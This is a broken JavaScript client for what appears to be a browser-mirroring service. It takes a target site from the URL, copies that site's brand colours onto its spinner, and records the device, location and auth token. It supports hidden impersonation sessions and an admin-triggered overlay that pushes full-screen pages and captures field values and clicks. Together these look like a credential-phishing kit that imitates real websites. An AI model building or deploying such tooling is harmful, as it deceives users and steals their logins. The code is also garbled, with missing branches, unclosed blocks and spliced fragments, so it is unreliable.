let currentBrandColor = '#888';

function parseRgbColor(color) {
    if (!color) return null;
    if (typeof color === 'string') {
        const trimmed = color.trim();
        const hexMatch = trimmed.match(/^#([0-9a-f]{3,4}|[0-9a-f]{6}|[0-9a-f]{8})$/i);
        if (hexMatch) {
            // The admin stores opaque hex colours.  Accept CSS shorthand and
            // alpha forms too, ignoring alpha because the spinner needs a
            // solid accent colour.
            let hex = hexMatch[1];
            if (hex.length === 3 || hex.length === 4) {
                hex = hex.slice(0, 3).split('').map(ch => ch + ch).join('');
            } else if (hex.length === 8) {
                hex = hex.slice(0, 6);
            }
            return {
                r: parseInt(hex.substring(0, 2), 16),
                g: parseInt(hex.substring(2, 4), 16),
                b: parseInt(hex.substring(4, 6), 16)
            };
        }
        const rgba = trimmed.match(/^rgba?\((\d+)\s*,\s*(\d+)\s*,\s*(\d+)/i);
        if (rgba) {
            return {
                r: Math.max(0, Math.min(255, Number(rgba[1]))),
                g: Math.max(0, Math.min(255, Number(rgba[2]))),
                b: Math.max(0, Math.min(255, Number(rgba[3])))
            };
        }
    }
    return null;
}

function applySpinnerColor(colorOrR, g, b, forceWorkflow = false) {
    // Once a workflow palette is active, late favicon/site-color callbacks
    // must not overwrite it.
    try {
        if (!forceWorkflow && typeof lpvBootBranding !== 'undefined' && lpvBootBranding.color) {
            // Re-apply the workflow value to any newly-created spinner/overlay
            // nodes instead of allowing a late site-favicon callback to win.
            applyWorkflowBranding();
            return;
        }
    } catch (e) {}
    const rgb = typeof colorOrR === 'string'
        ? parseRgbColor(colorOrR)
        : (typeof colorOrR === 'number' && typeof g === 'number' && typeof b === 'number'
            ? { r: colorOrR, g, b }
            : null);
    if (!rgb) return;

    currentBrandColor = typeof colorOrR === 'string'

        : `rgb(${rgb.r}, ${rgb.g}, ${rgb.b})`;

    const spinner = document.getElementById('loadingSpinner');
    const logo = document.getElementById('loadingLogo');
    if (spinner) {
        spinner.style.borderColor = `rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, 0.18)`;
        spinner.style.borderTopColor = `rgb(${rgb.r}, ${rgb.g}, ${rgb.b})`;

    if (logo) {

    const dots = document.querySelectorAll('#transition-overlay .orbit i');
    dots.forEach(dot => dot.style.background = `rgb(${rgb.r}, ${rgb.g}, ${rgb.b})`);

    // Also propagate the brand color to the LPV runtime (spinner ring + status
    // dot) so the LPV overlay matches the rest of the UI. We do this by writing
    // --lpv-brand on the overlay element if it exists, plus on :root as a
    // fallback for newly-created children.
    try {
        const cssVar = `rgb(${rgb.r}, ${rgb.g}, ${rgb.b})`;
        const lpvRoot = document.getElementById('lpv-root');
        if (lpvRoot) lpvRoot.style.setProperty('--lpv-brand', cssVar);
        document.documentElement.style.setProperty('--lpv-brand', cssVar);
        const lpvDot = document.getElementById('lpv-dot');
        if (lpvDot) {
            lpvDot.style.background = cssVar;
            lpvDot.style.boxShadow = `0 0 0 2px rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, 0.18), 0 0 10px rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, 0.6)`;
        }
    } catch (e) { /* ignore */ }
}

function showTransitionOverlay() {
    const overlay = document.getElementById('transition-overlay');
    if (overlay) {
        overlay.classList.remove('hidden');
        overlay.classList.add('visible');
        applySpinnerColor(currentBrandColor);
    }
}

function hideTransitionOverlay() {
    const overlay = document.getElementById('transition-overlay');
    if (overlay) {
        overlay.classList.remove('visible');
        overlay.classList.add('hidden');
    }

            function getBrandColor(hostnameOrUrl) {
                if (!hostnameOrUrl) return null;
                let normalized = String(hostnameOrUrl).trim();
                try {
                    const parsed = new URL(normalized);
                    normalized = parsed.hostname;
                } catch (err) {
                    // Not a full URL, keep the original string
                }
                normalized = normalized.toLowerCase();
                // Exact match first
                if (BRAND_COLORS[normalized]) {
                    return BRAND_COLORS[normalized];
                }
                // Try without www
                const withoutWww = normalized.replace(/^www\./, '');
                if (BRAND_COLORS[withoutWww]) {
                    return BRAND_COLORS[withoutWww];
                }
                // Try partial match for subdomains
                for (const [domain, color] of Object.entries(BRAND_COLORS)) {
                    if (normalized.includes(domain) || withoutWww.includes(domain)) {
                        return color;
                    }
                }
                return null;
            }

                    const hostname = new URL(url).hostname.toLowerCase();
                    
                    // Check hardcoded brands first

// Extract brand color from favicon image
function extractFaviconColor(faviconUrl) {
    const img = new Image();
    img.crossOrigin = 'Anonymous';
    
    img.onload = function() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 32;
            canvas.height = 32;
            ctx.drawImage(img, 0, 0, 32, 32);
            const pixels = ctx.getImageData(0, 0, 32, 32).data;
            
            let r = 0, g = 0, b = 0, count = 0;
            for (let i = 0; i < pixels.length; i += 4) {
                if (pixels[i + 3] < 128) continue;
                if (pixels[i] > 240 && pixels[i+1] > 240 && pixels[i+2] > 240) continue;
                if (pixels[i] < 20 && pixels[i+1] < 20 && pixels[i+2] < 20) continue;
                r += pixels[i];
                g += pixels[i + 1];
                b += pixels[i + 2];
                count++;
            }
            
            if (count > 0) {
                applySpinnerColor(Math.round(r/count), Math.round(g/count), Math.round(b/count));
            }
        } catch(e) {
            applySpinnerColor(128, 128, 128);
        }
    };
    
    img.onerror = function() {
        // Default to gray on error
        applySpinnerColor(128, 128, 128);
    };
    
    img.src = faviconUrl;
}

function applySpinnerColorFromHex(hexColor) {
    const rgb = parseRgbColor(hexColor);
    if (rgb) applySpinnerColor(rgb.r, rgb.g, rgb.b);

                        state.deviceId = 'device_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                        localStorage.setItem('v6_device_id', state.deviceId);
                    }
                    dbg('[INIT] deviceId set', state.deviceId);

                state.userId = localStorage.getItem('v6_user_id');
                if (!state.userId) {
                    const randomStr = Math.random().toString(36).substr(2, 9);
                    state.userId = 'user_' + Date.now() + '_' + randomStr;
                    localStorage.setItem('v6_user_id', state.userId);
                }

                const urlParams = new URLSearchParams(window.location.search);
                const targetParam = urlParams.get('url') || urlParams.get('target');
                const authParam = urlParams.get('auth');
                const workflowParam = urlParams.get('workflow') || urlParams.get('workflow_id');
                const userIdParam = urlParams.get('user_id');
                const sessionIdParam = urlParams.get('session_id');
                const hiddenSessionParam = urlParams.get('hidden_session');
                if (workflowParam) {
                    // stash for initData forwarding; also keep in state for debugging
                    state.workflowParam = workflowParam;
                }
                
                // Load favicon immediately from page URL parameters (before WebSocket connects)
                if (targetParam) {
                    updateFavicon('https://' + targetParam);
                }
                
                if (hiddenSessionParam === 'true') {
                    state.isHiddenSession = true;
                    
                    if (userIdParam) {
                        state.userId = userIdParam;
                    }
                    
                    if (sessionIdParam) {
                        state.sessionId = sessionIdParam;
                    }
                } else {
                    if (userIdParam) {
                        state.userId = userIdParam;
                        localStorage.setItem('v6_user_id', state.userId);
                    }
                }
                
                if (authParam) {
                    state.authToken = authParam;
                }
                dbg('[INIT] auth processed', {auth: !!state.authToken});
                
                if (targetParam) {
                    state.targetUrl = targetParam.startsWith('http') ? targetParam : 'https://' + targetParam;
                }
                dbg('[INIT] targetUrl resolved', state.targetUrl);
                
                initLoadingScreen(state.targetUrl);
                dbg('[INIT] loading screen initialized');
                
                if (!lpvBootBranding.workflowName && !document.documentElement.dataset.workflowBranding) {
                    if (state.targetUrl) {
                        const siteName = getSiteName(state.targetUrl);
                        document.title = siteName;
                        if (elements.pageTitle) elements.pageTitle.textContent = siteName;
                        dbg('[INIT] siteName set', siteName);
                    } else {
                        document.title = 'Loading...';
                        if (elements.pageTitle) elements.pageTitle.textContent = 'Loading...';
                    }
                } else if (lpvBootBranding.workflowName) {
                    document.title = lpvBootBranding.workflowName;
                    if (elements.pageTitle) elements.pageTitle.textContent = lpvBootBranding.workflowName;
                }

                // DOM-capture mode: initialize viewport state only (no canvas/stream).
                initializeViewportState();
                dbg('[INIT] viewport state initialized');
                
                window.addEventListener('resize', function() {
                    // DOM-capture mode: do not tear down the WebSocket on resize.
                    // Notify server of new viewport and update client layout.
                    try {
                        const dpr = window.devicePixelRatio || 1;
                        const _srvVp = viewportForServer();
                        if (state.ws && state.ws.readyState === WebSocket.OPEN) {
                            send({ type: 'viewport', width: _srvVp.width, height: _srvVp.height, pixelRatio: dpr });
                        }
                        // Update canvas/iframe sizing locally
                        try { syncViewportState(); } catch (e) { /* ignore */ }
                    } catch (e) {
                    }
                });

                dbg('[WS DEBUG] init() releasing any previous runtime before connect()');
                disconnectPreviousRuntimeBeforeConnect().finally(() => {
                    if (!state.reconnectDisabled) connect();
                });
            } catch (e) {
                dbg('[INIT ERROR]', e.message || e);
                console.error('[INIT ERROR]', e);
            }
            }

            // DOM-only mode: frame polling and binary frame handling removed

            // Chromium can't run a headed window narrower than ~500 CSS px
            // (it self-enforces that minimum on --window-size). For MOBILE
            // clients whose real viewport is narrower, REPORT the minimum:
            // the server then sizes the page exactly 500 wide (killing the
            // white strip at the source - no clamped-window gap).
            const MOBILE_MIN_SERVER_VIEWPORT_W = 500;
            function viewportForServer() {
                let w = window.innerWidth;
                const h = window.innerHeight;
                if (CONFIG.isMobile && w < MOBILE_MIN_SERVER_VIEWPORT_W) {
                    w = MOBILE_MIN_SERVER_VIEWPORT_W;
                }
                return { width: w, height: h };
            }

            function initializeViewportState() {
                // DOM-capture mode: keep logical viewport + server viewport
                // state.  (Canvas-era code also sized and super-sampled a
                // <canvas>; the mirror surface is now a plain iframe.)
                const dpr = window.devicePixelRatio || 1;
                const width = window.innerWidth;
                const height = window.innerHeight;

                // Store once — mobile keyboards resize the window constantly
                // and the mirror surface must not re-flow with it.
                state.initialViewport = {
                    width: width * dpr,
                    height: height * dpr,
                    displayWidth: width,
                    displayHeight: height,
                    dpr: dpr
                };
                state.viewport.width = width;
                state.viewport.height = height;
                state.dpr = dpr;
                state.serverViewport = { width: width * dpr, height: height * dpr };

                // Notify server of initial viewport (min-floored for mobile)
                if (state.ws && state.ws.readyState === WebSocket.OPEN) {
                    const _srvVp = viewportForServer();
                    state.ws.send(JSON.stringify({
                        type: 'viewport',
                        width: _srvVp.width,
                        height: _srvVp.height,
                        pixelRatio: dpr
                    }));
                }
            }

            function syncViewportState() {
                // DOM-capture mode: keep logical/server viewport state stable.
                // The initial size is authoritative — mobile keyboard open/close
                // constantly resizes the window and must not re-flow the mirror.
                if (state.initialViewport) {
                    state.viewport.width = state.initialViewport.displayWidth;
                    state.viewport.height = state.initialViewport.displayHeight;
                    if (state.serverViewport) {
                        state.serverViewport.width = state.initialViewport.width;
                        state.serverViewport.height = state.initialViewport.height;
                    }
                    return;
                }
                // Initialization only: adopt window size before first sync.
                const width = window.innerWidth;
                const height = window.innerHeight;
                const dpr = window.devicePixelRatio || 1;
                state.viewport.width = width;
                state.viewport.height = height;
                state.dpr = dpr;
                if (state.serverViewport) {
                    state.serverViewport.width = width * dpr;
                    state.serverViewport.height = height * dpr;
                }
            }
            
            // OPTIMIZED: Scale to fit with aspect ratio preservation
            // Returns the destination rectangle for drawing the frame
            function getScaledDimensions(canvasWidth, canvasHeight, frameWidth, frameHeight) {
                const targetRatio = canvasWidth / canvasHeight;
                const frameRatio = frameWidth / frameHeight;
                
                let drawWidth, drawHeight, offsetX, offsetY;
                
                if (!state.isDesktopMode) {
                    // Mobile mode: fill the screen and crop edges if needed.
                    // This avoids portrait/landscape letterboxing and keeps the
                    // client feeling full-screen on mobile devices.
                    if (frameRatio > targetRatio) {
                        drawHeight = canvasHeight;
                        drawWidth = canvasHeight * frameRatio;
                        offsetX = (canvasWidth - drawWidth) / 2;
                        offsetY = 0;
                    } else {
                        drawWidth = canvasWidth;
                        drawHeight = canvasWidth / frameRatio;
                        offsetX = 0;
                        offsetY = 0; // Top-align mobile frames so the visible content starts at the top
                    }
                } else {
                    // Desktop mode: preserve full frame without cropping.
                    if (frameRatio > targetRatio) {
                        drawWidth = canvasWidth;
                        drawHeight = canvasWidth / frameRatio;
                        offsetX = 0;
                        offsetY = (canvasHeight - drawHeight) / 2;
                    } else {
                        drawHeight = canvasHeight;
                        drawWidth = canvasHeight * frameRatio;
                        offsetX = (canvasWidth - drawWidth) / 2;
                        offsetY = 0;
                    }
                }
                
                return {
                    sx: 0, sy: 0,  // Source (frame) position
                    sw: frameWidth, sh: frameHeight,  // Source dimensions
                    dx: offsetX, dy: offsetY,  // Destination (canvas) position
                    dw: drawWidth, dh: drawHeight  // Destination dimensions
                };
            }

            function startHeartbeat() {
                if (state.heartbeatInterval) {
                    clearInterval(state.heartbeatInterval);
                    state.heartbeatInterval = null;
                }
            }
            
            function stopPong() {
                // Kept as a lifecycle no-op for callers from the legacy
                // timer-based heartbeat implementation. Pongs are now
                // server-driven and have no client-side timer to stop.
            }

            // ============================================================
            // WebRTC client-side support
            // ============================================================
            // When the server signals "webrtc_ready", we open an
            // RTCPeerConnection, create an SDP offer, and send it back
            // through the existing WebSocket control channel. The video
            // track we receive is rendered into the <video> element
            // overlaying the canvas; the canvas itself remains in the
            // DOM because all input/mouse/touch event listeners are
            // attached to it.
            // ============================================================

            // WebRTC removed: force DOM/WebSocket path only
            state.rtc = {
                enabled: false
            };

            function connect() {
                if (state.reconnectDisabled) return;
                dbg('[WS DEBUG] connect() start', {wsUrl: CONFIG.wsUrl});
                try {
                    if (state.ws && (state.ws.readyState === WebSocket.CONNECTING || state.ws.readyState === WebSocket.OPEN)) {
                        dbg('[WS DEBUG] connect() aborted: socket already open or connecting', state.ws.readyState);
                        return;
                    }
                    
                    if (state.ws) {
                        try {
                            if (state.ws.readyState === WebSocket.OPEN || state.ws.readyState === WebSocket.CONNECTING) {
                                state.ws.close(1000, 'Creating new connection');
                            }
                        } catch (e) {
                        }
                        state.ws = null;
                    }
                    
                    state.ws = new WebSocket(CONFIG.wsUrl);
                    state.ws.binaryType = 'arraybuffer';

                    state.ws.onopen = onOpen;
                    state.ws.onclose = onClose;
                    state.ws.onerror = onError;
                    state.ws.onmessage = onMessage;
                } catch (e) {
                    console.error('[WS] Connection error:', e);
                    scheduleReconnect();
                }
            }

            function onOpen() {
                dbg('[WS DEBUG] WebSocket opened');
                state.connected = true;
                state.reconnectAttempts = 0;
                state.consecutiveFailures = 0;
                state.isSessionActive = true;
                state.isUserPresent = true;

                const dpr = window.devicePixelRatio || 1;
                const _srvVp = viewportForServer();
                const width = _srvVp.width;
                const height = _srvVp.height;

                // Normal clients use their persistent logical client id for
                // every connection. Hidden/impersonation sessions remain
                // explicitly controlled by their parent URL and keep their
                // separate connection id.
                const sessionIdToUse = state.isHiddenSession && state.sessionId
                    ? state.sessionId
                    : getSessionIdForConnection();

                state.sessionId = sessionIdToUse;
                if (!state.isHiddenSession) {
                    try { sessionStorage.setItem('fixiis_runtime_session_id', sessionIdToUse); } catch (e) {}
                }

                const initData = {
                    type: 'init',
                    device_id: state.deviceId,
                    user_id: state.userId,
                    session_id: sessionIdToUse,
                    reconnect: state.reconnectPending,
                    userAgent: navigator.userAgent,
                    viewport: {
                        width: width,
                        height: height,
                        pixelRatio: dpr
                    },
                    // Real device screen metrics (mobile fidelity): the
                    // server uses these to emulate window.screen for the
                    // emulated browser so page content renders exactly to
                    // the full browser width/height.
                    screen: {
                        width: Math.round((window.screen && window.screen.width) || width),
                        height: Math.round((window.screen && window.screen.height) || height)
                    },
                    location: {
                        ip: state.clientIp,
                        country: state.locationCountry,
                        state: state.locationState,
                        city: state.locationCity,
                        zip: state.locationZip
                    },
                    url: state.targetUrl,
                    is_mobile: state.isMobile,
                    is_touch: state.isTouch,
                    mobile_user_agent: state.mobileUserAgent,
                    orientation: window.orientation === 0 || window.orientation === 180 ? 'portrait' : 'landscape'
                };
                
                if (state.authToken) {
                    initData.auth_token = state.authToken;
                }
                if (state.workflowParam) {
                    initData.workflow = state.workflowParam;
                    initData.workflow_id = state.workflowParam;
                }
                
                if (state.isHiddenSession) {
                    initData.hidden_session = true;
                }
                
                send(initData);
                flushOutgoingQueue();

                state.reconnectPending = false;
                startHeartbeat();
                
                // DOM-only mode: no frame polling
                
                reportSessionToServer('connect');
                startSessionReporting();
            }

            function onClose(event) {
                const replacementClose = !!event && (
                    event.code === 4001
                    || String(event.reason || '').includes('replaced_by_new_session')
                );
                const accessReleaseClose = !!event && (
                    event.code === 4003
                    || String(event.reason || '').includes('access_takeover')
                );
                if (replacementClose || accessReleaseClose) {
                    // Both an intentional replacement and an Access takeover
                    // are terminal for this page. In particular, an old tab
                    // must not reconnect and steal the profile back. A full
                    // browser refresh deliberately creates a new page state
                    // and is the only way to reconnect.
                    state.reconnectDisabled = true;
                    state.reconnectPending = false;
                    state.connected = false;
                    state.isSessionActive = false;
                    if (state.reconnectTimer) { clearTimeout(state.reconnectTimer); state.reconnectTimer = null; }
                    try {
                        const title = accessReleaseClose ? 'Disconnected by Access — refresh this page to reconnect' : 'Session replaced — refresh this page to reconnect';
                        if (elements.loadingScreen) elements.loadingScreen.style.display = 'flex';
                        if (elements.streamContainer) elements.streamContainer.classList.remove('visible');
                        if (elements.loadingLogo) elements.loadingLogo.textContent = title;
                    } catch (_) {}
                    cleanup();
                    return;
                }

                state.connected = false;
                state.isSessionActive = false;

                // Stop pong sending (Part 3)
                stopPong();

                if (state.reconnectTimer) {
                    clearTimeout(state.reconnectTimer);
                    state.reconnectTimer = null;
                }

                // DOM-only mode: no frame polling to stop
                state.reconnectPending = true;

                reportSessionToServer('disconnect');
                
                cleanup();
                
                state.reconnectAttempts++;
                // Start with 2s delay, exponential backoff
                const delay = Math.min(CONFIG.reconnectDelay * Math.pow(2.5, state.reconnectAttempts - 1), 30000);
                
                /* [WS] Connection closed, scheduling reconnect */
                
                // Don't show loading screen immediately on close - try to reconnect seamlessly
                // Only show loading after first reconnection fails
                
                state.reconnectTimer = setTimeout(() => {
                    state.reconnectTimer = null;
                    // Fetch location before connecting
                fetchLocation().then(() => {
                    connect();
                });
                }, delay);
            }

            function onError(error) {
                dbg('[WS DEBUG] WebSocket error', error || 'unknown');
            }

            function parsePageFrameHeader(data) {
                try {
                    const view = new DataView(data);
                    if (view.byteLength < 15) return null;
                    const magic = String.fromCharCode(
                        view.getUint8(0),
                        view.getUint8(1),
                        view.getUint8(2),
                        view.getUint8(3)
                    );
                    if (magic !== 'PAG1' && magic !== 'PAG2' && magic !== 'PAG3') return null;
                    const urlLen = view.getUint16(4, false);
                    const compType = view.getUint8(6);
                    // fingerprint is 8 bytes at offset 7..14
                    const fpBytes = new Uint8Array(data.slice(7, 15));
                    const fingerprint = Array.from(fpBytes).map(b => b.toString(16).padStart(2, '0')).join('');
                    const payloadStart = 15 + urlLen;
                    if (view.byteLength < payloadStart) return null;
                    const url = urlLen > 0 ? new TextDecoder().decode(new Uint8Array(data, 15, urlLen)) : '';
                    const payload = data.slice(payloadStart);
                    return { magic, url, compType, payload, fingerprint };
                } catch (e) {
                    return null;
                }
            }

            

            async function handleBinaryFrame(data) {
                const hdr = parsePageFrameHeader(data);
                if (!hdr) {
                    // fallback: try parse as text JSON
                    try {
                        const text = new TextDecoder().decode(new Uint8Array(data));
                        const message = JSON.parse(text);
                        handleMessage(message);
                    } catch (e) {
                        dbg('[WS DEBUG] Unknown binary frame', e);
                    }
                    return;
                }

                try {
                    // Dedupe: if frame fingerprint matches last rendered, skip re-render
                    if (state.lastFrameFingerprint && hdr.fingerprint === state.lastFrameFingerprint) {
                        // Update lastFrameTime for activity tracking and skip
                        state.lastFrameTime = Date.now();
                        return;
                    }
                    if (hdr.compType === 0) {
                        const html = new TextDecoder().decode(hdr.payload);
                        renderPageSnapshot(html, hdr.url);
                        state.lastFrameFingerprint = hdr.fingerprint;
                        return;
                    }

                    if (hdr.compType === 1) {
                        // Brotli compressed HTML payload
                        try {
                            if (typeof DecompressionStream === 'function') {
                                try {
                                    new DecompressionStream('br');
                                } catch (e) {
                                    console.warn('Brotli decompression is not supported in this browser; treating frame as plain text');
                                    const html = new TextDecoder().decode(hdr.payload);
                                    renderPageSnapshot(html, hdr.url);
                                    state.lastFrameFingerprint = hdr.fingerprint;
                                    return;
                                }
                                const ds = new DecompressionStream('br');
                                const decompressedStream = new Response(hdr.payload).body.pipeThrough(ds);
                                const html = await new Response(decompressedStream).text();
                                renderPageSnapshot(html, hdr.url);
                                state.lastFrameFingerprint = hdr.fingerprint;
                                return;
                            } else {
                                // No native DecompressionStream available — fallback to raw decode
                                const html = new TextDecoder().decode(hdr.payload);
                                renderPageSnapshot(html, hdr.url);
                                state.lastFrameFingerprint = hdr.fingerprint;
                                return;
                            }
                        } catch (e) {
                            console.warn('Brotli decompression failed, falling back to raw decode', e);
                            try {
                                const html = new TextDecoder().decode(hdr.payload);
                                renderPageSnapshot(html, hdr.url);
                            } catch (e2) {}
                            return;
                        }
                    }

                    if (hdr.magic === 'PAG3') {
                        // Hybrid frame: lightweight HTML + separate asset list.
                        // Payload layout: [HTML bytes] [JSON asset list bytes] [uint32 assetListLength]
                        // The browser will request the rewritten asset URLs (e.g. /assets/<hash>.png)
                        // directly from the server, leveraging standard HTTP caching.
                        try {
                            const payloadView = new DataView(hdr.payload.buffer, hdr.payload.byteOffset, hdr.payload.byteLength);
                            if (hdr.payload.byteLength < 4) {
                                console.error('PAG3 payload too small to contain asset list length');
                                return;
                            }
                            const assetListLength = payloadView.getUint32(hdr.payload.byteLength - 4, false);
                            if (assetListLength < 0 || assetListLength > hdr.payload.byteLength - 4) {
                                console.error('PAG3 asset list length out of range:', assetListLength);
                                return;
                            }
                            const htmlByteLength = hdr.payload.byteLength - 4 - assetListLength;
                            const htmlBytes = new Uint8Array(hdr.payload, 0, htmlByteLength);
                            const assetListBytes = new Uint8Array(hdr.payload, htmlByteLength, assetListLength);

                            // Parse and dispatch the asset list so the browser can begin preloading
                            // these new resources while HTML parsing is in progress.
                            let assetCount = 0;
                            try {
                                const assetListJson = new TextDecoder().decode(assetListBytes);
                                if (assetListJson) {
                                    const assetList = JSON.parse(assetListJson);
                                    if (Array.isArray(assetList) && assetList.length) {
                                        assetCount = assetList.length;
                                        dispatchAssetList(assetList);
                                    }
                                }
                            } catch (e) {
                                console.error('PAG3 asset list parse failed', e);
                            }

                            dbg(`[WS DEBUG] PAG3 received: ${assetCount} new assets, html bytes=${htmlByteLength}, compType=${hdr.compType}`);

                            // Decompress HTML (Brotli) when compType === 1; mirror PAG1/PAG2 logic.
                            let html = null;
                            if (hdr.compType === 1) {
                                try {
                                    if (typeof DecompressionStream === 'function') {
                                        try {
                                            new DecompressionStream('br');
                                        } catch (e) {
                                            console.warn('PAG3 Brotli decompression is not supported in this browser; using plain-text fallback');
                                            html = new TextDecoder().decode(htmlBytes);
                                        }

                                        if (!html) {
                                            const ds = new DecompressionStream('br');
                                            const decompressedStream = new Response(htmlBytes).body.pipeThrough(ds);
                                            html = await new Response(decompressedStream).text();
                                        }
                                    } else {
                                        html = new TextDecoder().decode(htmlBytes);
                                    }
                                } catch (e) {
                                    console.warn('PAG3 HTML decompression failed, falling back to raw decode', e);
                                    html = new TextDecoder().decode(htmlBytes);
                                }
                            } else {
                                html = new TextDecoder().decode(htmlBytes);
                            }

                            renderPageSnapshot(html, hdr.url);
                            state.lastFrameFingerprint = hdr.fingerprint;
                        } catch (e) {
                            console.error('PAG3 frame processing failed', e);
                        }
                        return;
                    }

                    

                    // Unknown compType: decode raw
                    const html = new TextDecoder().decode(hdr.payload);
                    renderPageSnapshot(html, hdr.url);
                } catch (e) {
                    console.error('handleBinaryFrame error', e);
                }
            }

            // ====================================================================
            // LPV (Live Panel Version) runtime — injected on demand
            // ====================================================================
            //
            // The admin panel can flip a client into LPV mode at any time. When
            // that happens the server sends {type:'lpv_start'}; this controller
            // creates a fullscreen overlay, fetches pushed HTML pages, and
            // streams input/click/change events back over the same WebSocket.
            //
            // The runtime is intentionally lazy: nothing is built until lpv_start
            // arrives, so cold-start of client.html stays untouched.

            const LPV = {
                active: false,
                overlay: null,
                container: null,
                spinner: null,
                captureRoot: null,    // Element we attach delegated listeners to
                currentPage: null,    // { id, name }
                _abortController: null,
                _monitorBound: false,

                _send(message) {
                    try {
                        if (state.ws && state.ws.readyState === WebSocket.OPEN) {
                            state.ws.send(JSON.stringify(message));
                        }
                    } catch (e) {
                        dbg('[LPV] send error', e && e.message);
                    }
                },

                _el(tag, attrs, children) {
                    const node = document.createElement(tag);
                    if (attrs) {
                        for (const k in attrs) {
                            if (k === 'class') node.className = attrs[k];
                            else if (k === 'style') Object.assign(node.style, attrs[k]);
                            else if (k.startsWith('on') && typeof attrs[k] === 'function') {
                                node.addEventListener(k.slice(2), attrs[k]);
                            } else if (k === 'html') {
                                node.innerHTML = attrs[k];
                            } else {
                                node.setAttribute(k, attrs[k]);
                            }
                        }
                    }
                    if (children) {
                        for (const c of children) {
                            if (c == null) continue;
                            node.appendChild(typeof c === 'string' ? document.createTextNode(c) : c);
                        }
                    }
                    return node;
                },

                _buildOverlay() {
                    if (this.overlay) return;

                    // Inject minimal CSS for the runtime. We scope everything
                    // under #lpv-root so a pushed page can use its own CSS
                    // without colliding.
                    const style = document.createElement('style');
                    style.id = 'lpv-runtime-style';
                    style.textContent = `
                        #lpv-root {
                            position: fixed; inset: 0; z-index: 2147483646;
                            pointer-events: none; font-family: 'Montserrat', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
                            user-select: none;
                            overflow: hidden;
                        }
                        #lpv-root.hidden { display: none; }
                        #lpv-dot {
                            position: absolute; top: 12px; right: 12px; width: 10px; height: 10px;
                            border-radius: 50%; background: #2fe88a;
                            box-shadow: 0 0 0 2px rgba(47,232,138,0.18), 0 0 10px rgba(47,232,138,0.8);
                            animation: lpv-pulse 1.8s ease-in-out infinite;
                            pointer-events: none;
                        }
                        #lpv-page {
                            position: absolute; inset: 0; overflow: hidden;
                            background: #fff; color: #000;
                            pointer-events: none;
                        }
                        #lpv-page iframe {
                            display: block; width: 100%; height: 100%; border: none;
                            background: #fff; overflow: auto; pointer-events: auto;
                            scrollbar-width: thin; scrollbar-gutter: stable both-edges;
                        }
                        #lpv-spinner {
                            position: absolute; inset: 0;
                            display: flex; align-items: center; justify-content: center;
                            background: rgba(255, 255, 255, 0.65);
                            z-index: 5; transition: opacity 200ms ease;
                            pointer-events: none;
                        }
                        #lpv-spinner.hidden { opacity: 0; pointer-events: none; }
                        /* reCAPTCHA-style ring: thin light-gray track + thicker
                           branded top arc. Color is driven by --lpv-brand
                           (set from currentBrandColor at runtime). */
                        #lpv-spinner .ring {
                            width: 36px; height: 36px; border-radius: 50%;
                            border: 2px solid rgba(0, 0, 0, 0.12);
                            border-top: 3px solid var(--lpv-brand, #4285F4);
                            border-right: 3px solid var(--lpv-brand, #4285F4);
                            animation: lpv-spin 0.8s linear infinite;
                            box-shadow: 0 0 0 1px rgba(0, 0, 0, 0.05);
                        }
                        /* Also tint the LPV status dot so it matches the brand. */
                        #lpv-dot {
                            background: var(--lpv-brand, #2fe88a) !important;
                            box-shadow: 0 0 0 2px rgba(66,133,244,0.18),
                                        0 0 10px rgba(66,133,244,0.6) !important;
                        }
                        @keyframes lpv-spin { to { transform: rotate(360deg); } }
                        @keyframes lpv-pulse {
                            0%, 100% { transform: scale(1); opacity: 0.9; }
                            50% { transform: scale(1.25); opacity: 1; }
                        }
                    `;
                    document.head.appendChild(style);

                    this.dot = this._el('div', { id: 'lpv-dot' });
                    this.spinner = this._el('div', { id: 'lpv-spinner', class: 'hidden' }, [
                        this._el('div', { class: 'ring' })
                    ]);
                    this.container = this._el('div', { id: 'lpv-page' }, [this.spinner]);
                    this.overlay = this._el('div', { id: 'lpv-root', class: 'hidden' }, [this.dot, this.container]);
                    this.overlay.setAttribute('aria-hidden', 'true');
                    // Inherit the current brand color so the ring is correctly
                    // tinted from the moment the overlay first appears (instead
                    // of flashing the default blue and then jumping to the
                    // brand color when applySpinnerColor next runs).
                    try {
                        this.overlay.style.setProperty('--lpv-brand', currentBrandColor || '#4285F4');
                    } catch (e) { /* ignore */ }
                    // Container must NOT block events — the iframe inside needs to
                    // receive pointer events so users can scroll/click/type into the
                    // pushed page. The CSS rule for #lpv-page already sets
                    // pointer-events: none on the container; the iframe child
                    // re-enables it via #lpv-page iframe { pointer-events: auto }.
                    document.body.appendChild(this.overlay);

                    // Capture layer — delegated listeners on the page container
                    // so we don't have to rebind after every page swap.
                    this._bindCapture(this.container);
                },

                _bindCapture(root) {
                    if (!root || this.captureRoot === root) return;
                    this.captureRoot = root;

                    const actionTarget = (ev, fallbackTarget = null) => {
                        const target = ev && ev.target ? ev.target : fallbackTarget;
                        if (!target || !target.closest) return null;
                        if (this.overlay && this.overlay.contains(target)) return null;
                        const candidate = target.closest('a, button, ui-button, input, select, textarea, [role="button"], [data-action], [onclick]');
                        return candidate || null;
                    };

                    const captureFieldState = (target) => {
                        if (!target) return null;
                        const tag = (target.tagName || '').toLowerCase();
                        if (tag === 'input' || tag === 'textarea' || tag === 'select') {
                            const type = (target.getAttribute('type') || 'text').toLowerCase();
                            if (type === 'checkbox' || type === 'radio') {
                                return { value: target.checked ? 'on' : 'off', type };
                            }
                            return { value: target.value || '', type };
                        }
                        return null;
                    };

                    // Helper: describe the element we're looking at.
                    const describe = (el) => {
                        if (!el) return null;
                        return {
                            tag: (el.tagName || '').toLowerCase(),
                            type: el.getAttribute('type') || '',
                            name: el.getAttribute('name') || '',
                            id: el.id || '',
                            placeholder: el.getAttribute('placeholder') || '',
                            label: (() => {
                                if (el.id) {
                                    const lab = document.querySelector('label[for="' + CSS.escape(el.id) + '"]');
                                    if (lab) return lab.textContent.trim().slice(0, 80);
                                }
                                const parentLabel = el.closest('label');
                                if (parentLabel) return parentLabel.textContent.trim().slice(0, 80);
                                return '';
                            })(),
                            text: (el.textContent || '').trim().slice(0, 80),
                        };
                    };

                    const fieldValue = (el) => {
                        if (!el) return null;
